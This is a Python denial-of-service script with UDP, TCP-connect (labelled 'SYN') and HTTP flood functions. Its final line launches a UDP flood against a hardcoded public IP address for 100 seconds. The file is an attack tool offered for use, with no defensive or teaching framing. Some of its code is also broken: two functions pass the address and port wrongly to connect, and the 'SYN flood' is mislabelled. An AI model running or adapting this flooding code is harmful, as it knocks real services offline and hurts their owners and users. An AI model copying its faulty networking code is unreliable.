import socket
import time

def __udp__(ip: str, port: int, message: str or bytes, duration: int) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(duration)
    target = (ip, port)
    __start_time__ = time.time()
    __packet_count_ = 0
    while True:
        try:
            s.sendto(message.encode(), target)
            __packet_count_ +=1
            print("\n send packets to >>> {} | Send >>> {}".format(ip, __packet_count_))
        except socket.error as e:
            print(str(e))
            break

        if time.time() - __start_time__ >= duration:
            break
        
        time.sleep(0.001)
    s.close()



def __syn_flood__(ip: int, port: int, duration: int) -> dict:
    __send__ = 0
    __timeout__ = time.time() + int(duration)
    while True:
        try:
            if (time.time() > __timeout__):
                break
            else:
                pass
            __sock__ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            __sock__.connect(ip, port)
            __send__ +=1
            print("\n attacking >>> {} | Packets send >>> {}".format(ip, __send__))
            __sock__.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("Stopped..")
            raise SystemExit


def __http_flood__(ip: int, port: int, duration: int) -> None:
    __socket__ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    __http_request__ =  b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
    __send__ = 0
    __timeout__ = time.time() + int(duration)
    while True:
        try:
            if (time.time() > __timeout__):
                break
            else:
                pass
            __socket__ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            __socket__.connect(ip, port)
            __socket__.sendall(__http_request__)
            __send__ +=1
            print("\n attacking >>> {} | Packets send >>> {}".format(ip, __send__))
        except KeyboardInterrupt:
            print("stopped.")
            break
        __socket__.close()


__udp__("217.248.193.104", 80, "dfwfeefwfewfefew", 100)
